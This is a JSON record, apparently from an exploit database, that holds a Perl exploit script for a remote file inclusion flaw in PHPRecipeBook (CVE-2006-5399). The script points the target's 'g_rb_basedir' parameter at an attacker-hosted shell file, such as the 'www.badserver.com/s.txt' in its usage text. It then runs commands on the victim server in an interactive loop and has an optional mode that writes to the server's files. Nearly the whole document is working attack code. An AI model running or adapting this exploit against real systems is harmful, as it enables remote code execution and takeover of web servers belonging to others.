{
  "id": "2584",
  "title": "PHPRecipeBook 2.35 - &#039;g_rb_basedir&#039; Remote File Inclusion",
  "cve": "CVE-2006-5399",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n\r\n#####################################################################################################\r\n#                                                                                                   #\r\n# PHPRecipeBook 2.36                                                                                #\r\n#                                                                                                   #\r\n# Class:  Remote File Include Vulnerability                                                         #\r\n#                                                                                                   #\r\n# Date:   2006/10/16                                                                                #\r\n#                                                                                                   #\r\n# Remote: Yes                                                                                       #\r\n#                                                                                                   #\r\n# Type:   Highly critical                                                                           #\r\n#                                                                                                   #\r\n# Vendor: http://phprecipebook.sourceforge.net/                                                     #\r\n#                                                                                                   #\r\n# Download: http://sourceforge.net/project/showfiles.php?group_id=65127                             #\r\n#                                                                                                   #\r\n# Note: Successful exploitation requires register_globals = on and magic_quotes_gpc = on            #\r\n#                                                                                                   #\r\n# Discovered & Exploit by: r0ut3r ( writ3r@gmail.com)                                               #\r\n#                                                                                                   #\r\n# Exploit: recipe2.36_xpl.pl                                                                        #\r\n#                                                                                                   #\r\n#####################################################################################################\r\n\r\nuse LWP::UserAgent;\r\nuse LWP::Simple;\r\n\r\n$target = @ARGV[0];\r\n$shellsite = @ARGV[1];\r\n$shellcmd = @ARGV[2];\r\n$file = \"/classes/Import_MM.class.php?g_rb_basedir=\";\r\n\r\nif(!$target || !$shellsite)\r\n{\r\n    usage();\r\n}\r\n\r\nheader();\r\n\r\nprint \"Type 'exit' to quit\";\r\nprint \"[cmd]\\$\";\r\n$cmd = <STDIN>;\r\n\r\nwhile ($cmd !~ \"exit\")\r\n{\r\n    $xpl = LWP::UserAgent->new() or die;\r\n        $req =\r\nHTTP::Request->new(GET=>$target.$file.$shellsite.'?&'.$shellcmd.'='.$cmd)\r\nor die(\"\\n\\n Failed to connect.\");\r\n        $res = $xpl->request($req);\r\n        $r = $res->content;\r\n        $r =~ tr/[\\n]/[&#234;]/;\r\n\r\n    if (@ARGV[4] eq \"-r\")\r\n    {\r\n        print $r;\r\n    }\r\n    elsif (@ARGV[5] eq \"-p\")\r\n    {\r\n    # if not working change cmd variable to null and apply patch manually.\r\n    $cmd = \"echo if(basename(__FILE__) == basename(\\$_SERVER['PHP_SELF'])) die(); >> Import_MM.class.php\";\r\n    print q\r\n    {\r\n########################################################################\r\n                 Patch Applied\r\nCode added to Import_MM.class.php:\r\nif(basename(__FILE__) == basename($_SERVER['PHP_SELF']))\r\n    die();\r\n\r\nNOTE: Adding patch function has not been tested. If does not complie or\r\nthere is an error, simply make cmd = null and add the patch code to\r\nImport_MM.class.php\r\n########################################################################\r\n    }\r\n    }\r\n    else\r\n    {\r\n    print \"[cmd]\\$\";\r\n    $cmd = <STDIN>;\r\n    }\r\n}\r\n\r\nsub header()\r\n{\r\n    print q\r\n    {\r\n########################################################################\r\n           PHPRecipeBook 2.36 - Remote File Include Exploit\r\n            Vulnerability discovered and exploit by r0ut3r\r\n                          writ3r@gmail.com\r\n            For recipe administrator testing purposes only!\r\n########################################################################\r\n    };\r\n}\r\n\r\nsub usage()\r\n{\r\nheader();\r\n    print q\r\n    {\r\n########################################################################\r\nUsage:\r\nperl recipe2.36_xpl.pl <Target website> <Shell Location> <CMD Variable> <-r> <-p>\r\n<Target Website> - Path to target eg: www.recipevuln.target.com\r\n<Shell Location> - Path to shell eg: www.badserver.com/s.txt\r\n<CMD Variable> - Shell command variable name eg: cmd\r\n<r> - Show output from shell\r\n<p> - Patch Import_MM.class.php\r\nExample:\r\nperl a.pl http://localhost http://localhost/s.txt cmd -r -p\r\n########################################################################\r\n    };\r\nexit();\r\n}\r\n\r\n# milw0rm.com [2006-10-17]",
  "url": "https://www.exploit-db.com/exploits/2584"
}